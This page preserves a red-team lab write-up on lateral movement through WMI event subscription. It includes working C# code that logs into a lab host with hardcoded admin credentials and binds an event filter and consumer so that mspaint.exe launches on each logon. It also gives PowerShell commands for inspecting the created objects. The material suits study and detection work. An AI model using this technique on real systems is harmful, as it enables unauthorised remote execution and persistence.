---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Lateral Movement via WMI Event Subscription

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-lateral-movement-lateral-movement-via-wmi-events` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/lateral-movement-via-wmi-events.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Lateral Movement via WMI Event Subscription](../../topics/offensive-security/lateral-movement-via-wmi-event-subscription.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-lateral-movement-lateral-movement-via-wmi-events |
| name | Lateral Movement via WMI Event Subscription |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/lateral-movement/lateral-movement-via-wmi-events.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (655).png
- image (656).png
- wmi-events-lateralmovement.gif
_body: "# Lateral Movement via WMI Event Subscription\n\nThis is a quick lab to familiariaze with a lateral movement technique\
  \ using WMI events, as described in [@domchell](https://twitter.com/domchell) aricle [I Like to Move It: Windows Lateral\
  \ Movement Part 1 – WMI Event Subscription](https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/)\
  \ - go check it out for more details, including detection ideas.\n\nSee my other lab related to persistence using WMI events:\n\
  \n{% content-ref url=\"../persistence/t1084-abusing-windows-managent-instrumentation/\" %}\n[t1084-abusing-windows-managent-instrumentation](../persistence/t1084-abusing-windows-managent-instrumentation/)\n\
  {% endcontent-ref %}\n\n## Walkthrough\n\nThe below C# code for WMI events based lateral movement does a couple of things:\n\
  \n| Line                              | Action                                                                         \
  \                                                                                                                      \
  \                                                                              |\n| --------------------------------- |\
  \ ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\
  \ |\n| 29 - 33                           | Connects to the remote endpoint `192.168.56.105` using local admin credentials\
  \ `spotless:123456`                                                                                                    \
  \                                                                               |\n| 33 - 46                           |\
  \ <p>Creates a new WMI filter <code>evilSpotlessFilter</code> on <code>192.168.56.105</code>. <br>It will get triggered\
  \ when a new logon session is created on <code>192.168.56.105</code></p>                                               \
  \                                        |\n| 49 - 52                           | <p>Creates a WMI consumer <code>evilSpotlessConsumer</code>\
  \ on <code>192.168.56.105</code>. <br>This consumer executes <code>mspaint.exe</code> on <code>192.168.56.105</code>, when\
  \ the filter <code>evilSpotlessFilter</code> is triggered (upon new logon session creation)</p> |\n| 55 - 58           \
  \                | WMI filter `evilSpotlessFilter` and WMI consumer `evilSpotlessConsumer` are bound. In layman's terms,\
  \ the system `192.168.56.105` is instructed to **DEFINITELY** fire `mspaint.exe` on each new logon session that is created\
  \ on the system.                                      |\n\n```csharp\n// code completely stolen from @domchell article \n\
  // https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/\n// slightly\
  \ modified to accommodate this lab\n\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\
  using System.Threading.Tasks;\nusing System.Management;\n\nnamespace wmisubscription_lateralmovement\n{\n    class Program\n\
  \    {\n        static void Main(string[] args)\n        {\n\n            // Connect to remote endpoint for WMI management\n\
  \            string NAMESPACE = @\"\\\\192.168.56.105\\root\\subscription\";\n\n            ConnectionOptions cOption =\
  \ new ConnectionOptions();\n            ManagementScope scope = null;\n            scope = new ManagementScope(NAMESPACE,\
  \ cOption);\n            \n            scope.Options.Username = \"spotless\";\n            scope.Options.Password = \"123456\"\
  ;\n            scope.Options.Authority = string.Format(\"ntlmdomain:{0}\", \".\");\n            \n            scope.Options.EnablePrivileges\
  \ = true;\n            scope.Options.Authentication = AuthenticationLevel.PacketPrivacy;\n            scope.Options.Impersonation\
  \ = ImpersonationLevel.Impersonate;\n            scope.Connect();\n\n            // Create WMI event filter\n          \
  \  ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath(\"__EventFilter\"), null);\n\n       \
  \     string query = \"SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'\";\n\
  \            WqlEventQuery myEventQuery = new WqlEventQuery(query);\n\n            ManagementObject myEventFilter = wmiEventFilter.CreateInstance();\n\
  \            myEventFilter[\"Name\"] = \"evilSpotlessFilter\";\n            myEventFilter[\"Query\"] = myEventQuery.QueryString;\n\
  \            myEventFilter[\"QueryLanguage\"] = myEventQuery.QueryLanguage;\n            myEventFilter[\"EventNameSpace\"\
  ] = @\"root\\cimv2\";\n            myEventFilter.Put();\n\n            // Create WMI event consumer\n            ManagementObject\
  \ myEventConsumer = new ManagementClass(scope, new ManagementPath(\"CommandLineEventConsumer\"), null).CreateInstance();\n\
  \            myEventConsumer[\"Name\"] = \"evilSpotlessConsumer\";\n            myEventConsumer[\"ExecutablePath\"] = \"\
  mspaint.exe\";\n            myEventConsumer.Put();\n\n            // Bind filter and consumer\n            ManagementObject\
  \  myBinder = new ManagementClass(scope, new ManagementPath(\"__FilterToConsumerBinding\"), null).CreateInstance();\n  \
  \          myBinder[\"Filter\"] = myEventFilter.Path.RelativePath;\n            myBinder[\"Consumer\"] = myEventConsumer.Path.RelativePath;\n\
  \            myBinder.Put();\n\n            // Cleanup\n            // myEventFilter.Delete();\n            // myEventConsumer.Delete();\n\
  \            // myBinder.Delete();\n\n        }\n    }\n}\n```\n\n## Observations\n\nOnce `connect` method is called, a\
  \ couple of connections from the attacking machine (top right) are initiated to the target machine `192.168.56.105` (bottom\
  \ right) over port TCP 135 (traffic receiver is svchost.exe as it's hosting the RPC service through which we are communicating):\n\
  \n![](<../../.gitbook/assets/image (655).png>)\n\nAfter the code has executed, it will have created the WMI event filters,\
  \ consumers and bind them on the target host `192.168.56.105`.\n\nOn the target host, we can check if the said filters and\
  \ consumers were created like so:\n\n```csharp\n# view wmi filters\nGet-WmiObject -Class __EventFilter -Namespace root\\\
  subscription\n\n# view wmi consumers\nGet-WmiObject -Class __EventConsumer -Namespace root\\subscription\n\n# view bindings\n\
  Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\\subscription\n```\n\nBelow shows output of the `evilSpotlessFilter`\
  \ WMI filter we created on the target system:\n\n![](<../../.gitbook/assets/image (656).png>)\n\n## Demo\n\nBelow shows\
  \ the WMI events based lateral movement technique in action:\n\n* On the left, we compile and run the code that creates\
  \ WMI event filters, consumers and binds them together\n* In the top right corner - ther is a ProcMon that is set to capture\
  \ when a new `mspaint.exe` process starts. In our case, it should start once there is a new logon session created on the\
  \ system (remember, because of the `evilSpotlessFilter`)\n* In the bottom right corner there is a powershell console initiating\
  \ a new logon session with `runas.exe`. Once the authentication succeeds, a new logon session is created, cmd.exe is spawned\
  \ and the WMI event filter `evilSpotlessFilter` is triggered and WMI event consumer `evilSpotlessConsumer` kicks off the\
  \ `mspaint.exe`:\n\n![](../../.gitbook/assets/wmi-events-lateralmovement.gif)\n\n## References\n\n{% embed url=\"https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/\"\
  \ %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/win32/wmisdk/commandlineeventconsumer\" %}"
_relative_path: offensive-security/lateral-movement/lateral-movement-via-wmi-events.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/lateral-movement-via-wmi-events.md
````
